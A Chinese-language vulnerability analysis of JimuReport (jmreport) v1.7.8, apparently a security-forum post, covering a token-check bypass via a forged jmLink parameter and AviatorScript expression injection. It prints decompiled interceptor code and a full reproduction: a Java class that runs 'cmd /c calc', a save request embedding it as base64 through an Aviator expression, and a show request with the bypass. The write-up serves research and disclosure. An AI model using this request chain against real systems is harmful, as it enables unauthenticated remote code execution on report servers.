@@ -1,0 +1,237 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="585614a2e50d431cd03537ee0405edad">一、漏洞简介</h2>
+<p>积木报表（jmreport）存在权限绕过漏洞，攻击者可以通过绕过权限访问存在漏洞的接口，并利用AviatorScript表达式注入完成漏洞利用。</p>
+<h2 data-content="1" id="e5e891ccc5f71db3c463b6dccd7548f8">二、影响版本</h2>
+<p>测试版本：v1.7.8（低版本可能存在不同程度的限制）</p>
+<h2 data-content="1" id="887191f5c0b5ba775089822aff991a33">三、漏洞分析</h2>
+<h3 data-content="1" id="8bfc60375cc301f12242b72c22f9b629">权限绕过</h3>
+<p>在jmreport 1.6版本之后，引入了权限限制。然而，这个漏洞首先需要绕过权限拦截器的判断。<br/>
+org.jeecg.modules.jmreport.config.firewall.interceptor.JimuReportTokenInterceptor#preHandle</p>
+<pre><code>public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
+        if (!(handler instanceof HandlerMethod)) {
+            return true;
+        } else {
+            String var4 = d.i(request.getRequestURI().substring(request.getContextPath().length()));
+            log.debug("JimuReportInterceptor check requestPath = " + var4);
+            int var5 = 500;
+            if (n.a(var4)) {
+                log.error("请注意，请求地址有xss攻击风险！" + var4);
+                this.backError(response, "请求地址有xss攻击风险!", var5);
+                return false;
+            } else {
+                String var6 = this.jmBaseConfig.getCustomPrePath();
+                log.debug("customPrePath: {}", var6);
+                if (j.d(var6) &amp;&amp; !var6.startsWith("/")) {
+                    var6 = "/" + var6;
+                }
+
+                request.setAttribute("customPrePath", var6);
+                HandlerMethod var7 = (HandlerMethod)handler;
+                Method var8 = var7.getMethod();
+                if (var4.contains("/jmreport/shareView/")) {
+                    return true;
+                } else {
+                    JimuNoLoginRequired var9 = (JimuNoLoginRequired)var8.getAnnotation(JimuNoLoginRequired.class);
+                    if (j.d(var9)) {
+                        return true;
+                    } else {
+                        boolean var10 = false;
+
+                        try {
+                            var10 = this.verifyToken(request);
+                        } catch (Exception var14) {
+                        }
+
+                        if (!var10) {
+                            if (this.jimuReportShareService.isSharingEffective(var4, request)) {
+                                return true;
+                            } else {
+                                String var16 = request.getParameter("previousPage");
+                                if (j.d(var16)) {
+                                    if (this.jimuReportShareService.isShareingToken(var4, request)) {
+                                        return true;
+                                    } else {
+                                        log.error("分享链接失效或分享token不匹配(" + request.getMethod() + ")：" + var4);
+                                        this.backError(response, "分享链接失效或分享token不匹配，禁止钻取!", var5);
+                                        return false;
+                                    }
+                                } else {
+                                    log.error("Token校验失败！请求无权限(" + request.getMethod() + ")：" + var4);
+                                    this.backError(response, "Token校验失败，无权限访问！", var5);
+                                    return false;
+                                }
+                            }
+                        } else {
+                            b var15 = (b)var8.getAnnotation(b.class);
+                            if (var15 != null) {
+                                String[] var11 = var15.a();
+                                String[] var12 = this.jimuTokenClient.getRoles(request);
+                                if (var12 == null || var12.length == 0) {
+                                    log.error("此接口需要角色权限，请联系管理员！请求无权限(" + request.getMethod() + ")：" + var4);
+                                    if ("/jmreport/loadTableData".equals(var4)) {
+                                        var5 = GEN_TEST_DATA_CODE;
+                                    }
+
+                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);
+                                    return false;
+                                }
+
+                                boolean var13 = Arrays.stream(var12).anyMatch((code) -&gt; {
+                                    return j.a(code, var11);
+                                });
+                                if (!var13) {
+                                    log.error("此接口需要角色权限，请联系管理员！请求无权限(" + request.getMethod() + ")：" + var4);
+                                    if ("/jmreport/loadTableData".equals(var4)) {
+                                        var5 = GEN_TEST_DATA_CODE;
+                                    }
+
+                                    this.backError(response, NO_PERMISSION_PROMPT_MSG, var5);
+                                    return false;
+                                }
+                            }
+
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+    }</code></pre>
+<p>权限校验的大致逻辑包括：</p>
+<ul>
+<li>检查请求路径是否包含空格（防止XSS攻击）</li>
+<li>检查路径是否以<code>/jmreport/shareView/</code>开头</li>
+<li>检查请求的Controller是否存在<code>JimuNoLoginRequired</code>注解</li>
+<li>进行<code>verifyToken</code>验证（可以通过<code>org.jeecg.common.util.TokenUtils#verifyToken</code>或自定义代码实现）<br/>
+org.jeecg.modules.jmreport.desreport.service.a.f#isShareingToken</li>
+</ul>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817211901-44b111e2-5c9b-1.png"/></p>
+<p>如果<code>verifyToken</code>验证不通过，则进行分享token的验证。只要传入的<code>jmLink=YWFhfHxiYmI=</code>读取的token不在数据库中且访问路径不是以<code>/jmreport/view</code>开头，就会返回true，从而绕过权限验证。</p>
+<h3 data-content="1" id="a151171f6239662275ba1284919426c8">AviatorEvaluator表达式注入</h3>
+<p>利用此漏洞的接口为报表保存和查看接口，通过<code>save</code>接口保存aviator表达式，然后在<code>show</code>接口触发利用：</p>
+<pre><code>POST /jeecg-boot/jmreport/save
+org.jeecg.modules.jmreport.desreport.service.a.e#saveReport
+
+POST /jeecg-boot/jmreport/show
+org.jeecg.modules.jmreport.desreport.service.a.e#show</code></pre>
+<p>关于aviator表达式注入是郁离歌师傅2021年公开的，自身了解不多，只是简单说下利用手段，后续可深入在分析下；<br/>
+<a href="https://github.com/killme2008/aviatorscript/issues/421" target="_blank">There is a critical expression injection RCE vulnerability in this expression engine（该表达式引擎存在表达式注入漏洞） · Issue #421 · killme2008/aviatorscript (github.com)</a><br/>
+aviator表达式时可以直接new对象，但是不允许调用非public static的方法。可以使用BCELClassloader加载BCEL编码的形式完成RCE。whoopsunix师傅文章对高版本spring框架做了利用。</p>
+<pre><code>AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
+evaluator.execute("xxxxxxxx");
+
+最终的sink点：
+com.googlecode.aviator.BaseExpression#execute(java.util.Map&lt;java.lang.String,java.lang.Object&gt;)</code></pre>
+<p>跟踪路径</p>
+<p>org.jeecg.modules.jmreport.desreport.service.a.e#show<br/>
+org.jeecg.modules.jmreport.desreport.express.ExpressUtil#a(com.alibaba.fastjson.JSONObject)<br/>
+org.jeecg.modules.jmreport.desreport.express.a#a(com.alibaba.fastjson.JSONObject)<br/>
+org.jeecg.modules.jmreport.desreport.express.ExpressUtil#a(org.jeecg.modules.jmreport.desreport.express.b)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817211917-4e122e2e-5c9b-1.png"/></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240817211923-51db39d8-5c9b-1.png"/></p>
+<h2 data-content="1" id="b753e2e838ffeeb94985a71387d01551">四、准备工作</h2>
+<p>windows下mysql重新部署导致浪费了很多时间</p>
+<ul>
+<li>
+<p><strong>windows下mysql服务启动</strong></p>
+</li>
+<li>
+<p>按下 <code>Win + R</code> 键，输入 <code>services.msc</code> 并按回车，打开服务管理器。</p>
+</li>
+<li>在服务列表中找到 <code>MySQL</code> 服务。</li>
+<li>检查服务的状态，如果服务被禁用，请右键点击该服务，选择“属性”。</li>
+<li>
+<p>在“启动类型”下拉菜单中选择“自动”或“手动”，然后点击“应用”并启动服务。</p>
+</li>
+<li>
+<p><strong>sql脚本运行</strong></p>
+</li>
+</ul>
+<p>​   直接使用idea的数据库进行执行脚本</p>
+<ul>
+<li><strong>项目启动</strong></li>
+</ul>
+<p>​   使用jdk8启动，修改mysql配置文件，设置对应密码；</p>
+<ul>
+<li>
+<p><strong>线上模式</strong></p>
+<p>若开启线上模式需要token验证，需要集成相关代码，可以考虑使用jeecgboot项目，并开启Redis数据库</p>
+</li>
+</ul>
+<p>jeecgboot部署文档：<br/>
+<a href="https://help.jeecg.com/java/setup/idea/startup.html" target="_blank">IDEA启动项目 - JeecgBoot 文档中心</a></p>
+<p>如果遇到MySQL的访问权限错误，可以通过以下SQL语句授权后重启MySQL服务：</p>
+<blockquote>
+<p>localhost设置<br/>
+因为账户原因报错：Access denied for user 'root'@'localhost' (using password: YES)</p>
+</blockquote>
+<pre><code>GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost' WITH GRANT OPTION;
+FLUSH PRIVILEGES;
+
+之后重启服务
+net stop mysql
+
+net mysql start
+redis-service.exe
+
+之后分别启动前端和后端代码
+访问http://localhost:3100/即可</code></pre>
+<h2 data-content="1" id="f42fb1abb1f5da2ebf8f8dcc32e11a53">五、漏洞复现</h2>
+<ol>
+<li>准备恶意类，编译为class文件后转换为base64字符串</li>
+</ol>
+<pre><code>import java.io.IOException;
+
+public class evil{
+    static {
+        System.out.println("static Exec");
+        try {
+            Runtime.getRuntime().exec("cmd /c calc");
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
+        System.out.println("over");
+    }
+
+    public evil() {
+        // Empty constructor
+    }
+
+}</code></pre>
+<ol>
+<li>传入save接口请求包</li>
+</ol>
+<pre><code>POST /jeecg-boot/jmreport/save HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=UTF-8
+
+{"designerObj":{"id":"982136216903729152","name":"1111","type":"datainfo"},"name":"sheet1","freeze":"A1","freezeLineColor":"rgb(185, 185, 185)","styles":[],"displayConfig":{},"printConfig":{"paper":"A4","width":210,"height":297,"definition":1,"isBackend":false,"marginX":10,"marginY":10,"layout":"portrait","printCallBackUrl":""},"merges":[],"rows":{"0":{"cells":{"0":{"text":" =(use org.springframework.cglib.core.*;use org.springframework.util.*;ReflectUtils.defineClass('evil', Base64Utils.decodeFromString('yv66vgAAADQAMwoADQAXCQAYABkIABoKABsAHAoAHQAeCAAfCgAdACAHACEHACIKAAkAIwgAJAcAJQcAJgEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAg8Y2xpbml0PgEADVN0YWNrTWFwVGFibGUHACEBAApTb3VyY2VGaWxlAQAJZXZpbC5qYXZhDAAOAA8HACcMACgAKQEAC3N0YXRpYyBFeGVjBwAqDAArACwHAC0MAC4ALwEAC2NtZCAvYyBjYWxjDAAwADEBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAA4AMgEABG92ZXIBAARldmlsAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYAIQAMAA0AAAAAAAIAAQAOAA8AAQAQAAAAIQABAAEAAAAFKrcAAbEAAAABABEAAAAKAAIAAAAOAAQAEAAIABIADwABABAAAABsAAMAAQAAACeyAAISA7YABLgABRIGtgAHV6cADUu7AAlZKrcACr+yAAISC7YABLEAAQAIABEAFAAIAAIAEQAAAB4ABwAAAAUACAAHABEACgAUAAgAFQAJAB4ACwAmAAwAEwAAAAcAAlQHABQJAAEAFQAAAAIAFg=='), ClassLoader.getSystemClassLoader());)"}}},"len":100},"cols":{"len":50},"validations":[],"autofilter":{},"dbexps":[],"dicts":[],"loopBlockList":[],"zonedEditionList":[],"fixedPrintHeadRows":[],"fixedPrintTailRows":[],"rpbar":{"show":true,"pageSize":"","btnList":[]},"hiddenCells":[],"hidden":{"rows":[],"cols":[]},"background":false,"area":false,"dataRectWidth":100,"excel_config_id":"982136216903729152","pyGroupEngine":false}</code></pre>
+<ol>
+<li>show接口漏洞触发</li>
+</ol>
+<pre><code>POST /jeecg-boot/jmreport/show?previousPage=xxx&amp;jmLink=YWFhfHxiYmI= HTTP/1.1
+Host: localhost:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Content-Type: application/json;charset=UTF-8
+Content-Length: 27
+
+{"id":"982136216903729152"}</code></pre>
+<p><img src="https://cdn.nlark.com/yuque/0/2024/png/1634447/1723275841921-93014708-68b0-4004-b25b-7747285e5f04.png#averageHue=%23c9d4bc&amp;clientId=u08db2916-7f4e-4&amp;from=paste&amp;height=818&amp;id=u8dc1d982&amp;originHeight=1227&amp;originWidth=1787&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=208582&amp;status=done&amp;style=none&amp;taskId=u0f195bdf-d045-47fb-8851-1a16b146e64&amp;title=&amp;width=1191.3333333333333"/></p>
+<h2 data-content="1" id="2cfffb848c9b4abb2e86b066928dba4f">六、总结</h2>
+<p>关于Aviator表达式注入还有很多需要学习分析的点，漏洞缓解措施可以参考相关文章。环境搭建需要多多实践，特别是jeecgboot项目的部署。</p>
+<p><a href="https://mp.weixin.qq.com/s/yaFwDMrYtxbcY1wrqUi7eA" target="_blank">积木报表授权绕过漏洞缓解措施 (qq.com)</a></p>
+<p>本文主要参考了以下链接：</p>
+<blockquote>
+<p><a href="https://github.com/jeecgboot/JeecgBoot/issues/7014" target="_blank">https://github.com/jeecgboot/JeecgBoot/issues/7014</a><br/>
+[结合 Jimureport 的某个漏洞披露看 Aviator 表达式注入</p>
+</blockquote>
+</div>
+</div>
